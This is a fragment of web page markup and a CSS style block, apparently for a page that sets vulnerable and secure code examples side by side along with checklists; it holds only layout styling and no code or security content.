				<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
					<path d="M5 12h14M12 5l7 7-7 7"/>
				</svg>
			</a>
		</div>
	</article>
</div>

<style>
	/* Badge row */
	.badge-row {
		display: flex;
		gap: 0.5rem;
		margin-bottom: 1rem;
		flex-wrap: wrap;
	}

	/* Data Source Attribution */
	.data-source {
		font-size: 0.75rem;
		color: var(--text-tertiary);
		margin: 0.5rem 0 1.5rem;
	}

	.data-source a {
		color: var(--text-secondary);
	}

	/* Shared list styles - consolidate reasons, weaknesses, testing */
	.reasons-list,
	.weaknesses-list,
	.testing-checklist {
		list-style: none;
		padding: 0;
		margin: 1.5rem 0;
	}

	.reasons-list li,
	.weaknesses-list li,
	.testing-checklist li {
		padding: 0.75rem 0;
		border-bottom: 1px solid var(--border);
		color: var(--text-secondary);
		line-height: 1.6;
	}

	.reasons-list li:last-child,
	.weaknesses-list li:last-child,
	.testing-checklist li:last-child {
		border-bottom: none;
	}

	.reasons-list strong,
	.weaknesses-list strong,
	.testing-checklist strong {
		color: var(--text-primary);
	}

	.testing-checklist a {
		color: var(--green-dim);
	}

	/* Code Comparison - Stacked Layout */
	.code-comparison {
		display: flex;
		flex-direction: column;
		gap: 1rem;
		margin: 1.5rem 0;
	}

	.code-block.vulnerable {
		border-left: 3px solid var(--red);
	}

	.code-block.secure {
		border-left: 3px solid var(--green);
	}

	.code-label {
		padding: 0.5rem 1rem;
		font-family: 'JetBrains Mono', monospace;
		font-size: 0.7rem;
		font-weight: 600;
		text-transform: uppercase;
		letter-spacing: 0.05em;
		background: var(--bg-secondary);
		border-bottom: 1px solid var(--border);
	}

	.vulnerable .code-label {
		color: var(--red);
	}

	.secure .code-label {
		color: var(--green);
	}

	/* Implementation Steps */
	.implementation-steps ol {
		margin: 1rem 0;
		padding-left: 1.5rem;
		color: var(--text-secondary);
		line-height: 1.7;
	}

	.implementation-steps li {
		margin-bottom: 0.5rem;
	}

	.implementation-steps strong {
		color: var(--text-primary);
	}

	.implementation-steps code {
		background: var(--bg-tertiary);
		padding: 0.125rem 0.375rem;
		font-size: 0.8125rem;
	}

	/* Fix Prompt Section */
	.fix-prompt-section {
		margin: 2rem 0;
	}

	.fix-prompt-section h3 {
		margin-bottom: 0.75rem;
	}

	/* Framework Examples */
	.framework-example {
		margin: 2rem 0;
	}

	.framework-example h4 {
		margin-bottom: 1rem;
		color: var(--text-primary);
	}

	.reference-link {
		margin: 1rem 0 0;
		font-size: 0.875rem;
		color: var(--text-secondary);
	}

	.reference-link a {
		color: var(--green-dim);
	}
</style>
